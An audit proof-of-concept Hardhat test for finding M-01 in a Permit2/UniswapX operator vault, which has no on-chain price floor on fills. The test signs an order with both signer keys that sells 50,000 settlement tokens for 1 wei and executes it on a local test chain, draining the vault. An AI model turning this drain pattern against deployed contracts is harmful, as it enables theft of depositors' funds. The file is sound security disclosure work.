/**
 * Audit proof — M-01
 *
 * The vault approves Permit2 for the FULL uint256 on both assets in its
 * constructor, so `isValidSignature` is the only gate on outflows. That gate
 * (`VaultPolicy._orderPolicyOk`) bounds the INPUT amount by `maxOrderInput*`
 * and by quotable/liquid inventory, but never relates the output to the input:
 * there is no minimum-out, no price band, and no per-epoch notional cap. Any
 * order the two signers co-sign is honoured at any price.
 *
 * With both signer keys, an attacker signs an order selling the vault's whole
 * quotable settlement balance for 1 wei of corridor. The ERC-1271 check returns
 * the magic value and a real UniswapX fill drains the settlement for dust. Only
 * per-order size (not count, not price) limits the blast radius. This proves the
 * absence of any on-chain economic backstop. Status: Unresolved.
 */
import { expect } from 'chai'
import { ethers } from 'hardhat'

import { encodeLimitOrder } from '../../helpers/limitOrderPermit2'
import {
  CANONICAL_PERMIT2,
  ERC1271_MAGIC,
  cngn,
  deployOperatorVault,
  usdt,
} from '../fixtures/operatorVault.fixture'
import { seedShares } from '../helpers/vaultLifecycle'
import { signVaultEnvelope } from '../helpers/vaultSignatures'

describe('AUDIT M-01 — no on-chain price floor on fills', function () {
  it('authorizes and executes selling 50,000 settlement for 1 wei of corridor', async function () {
    const ctx = await deployOperatorVault({ realUniswapX: true })
    await seedShares(ctx, ctx.lp1, usdt(50_000n))
    const vaultAddr = await ctx.vault.getAddress()
    const filler = ctx.other

    const block = await ethers.provider.getBlock('latest')
    const epoch = await ctx.vault.tradingEpoch()
    const order = {
      reactor: ctx.reactor,
      vault: vaultAddr,
      permit2: CANONICAL_PERMIT2,
      chainId: 31337,
      nonce: (epoch << 128n) | 1n,
      deadline: BigInt(block!.timestamp + 600),
      inputToken: ctx.settlement.target as string,
      inputAmount: usdt(50_000n), // the entire quotable settlement balance
      outputToken: ctx.corridor.target as string,
      outputAmount: 1n, // ... for one atomic unit of corridor
      preferredFiller: ctx.preferredFiller,
      taker: filler.address,
    }
    const { hash, signature, params } = await signVaultEnvelope(ctx.strategy, ctx.risk, order)

    // The dual-signature ERC-1271 envelope validates this economically absurd
    // price — the on-chain policy has no opinion on it.
    expect(await ctx.vault.isValidSignature(hash, signature)).to.equal(ERC1271_MAGIC)

    // And it settles for real: the vault hands over 50,000 settlement and
    // receives 1 wei of corridor in return.
    const reactor = await ethers.getContractAt('LimitOrderReactor', ctx.reactor)
    await ctx.corridor.mint(filler.address, 1n)
    await ctx.corridor.connect(filler).approve(ctx.reactor, ethers.MaxUint256)

    const vaultBefore = await ctx.settlement.balanceOf(vaultAddr)
    await reactor.connect(filler).execute({ order: encodeLimitOrder(params), sig: signature })

    expect(vaultBefore - (await ctx.settlement.balanceOf(vaultAddr))).to.equal(usdt(50_000n))
    expect(await ctx.settlement.balanceOf(filler.address)).to.equal(usdt(50_000n))
    expect(await ctx.corridor.balanceOf(vaultAddr)).to.equal(1n)
  })
})
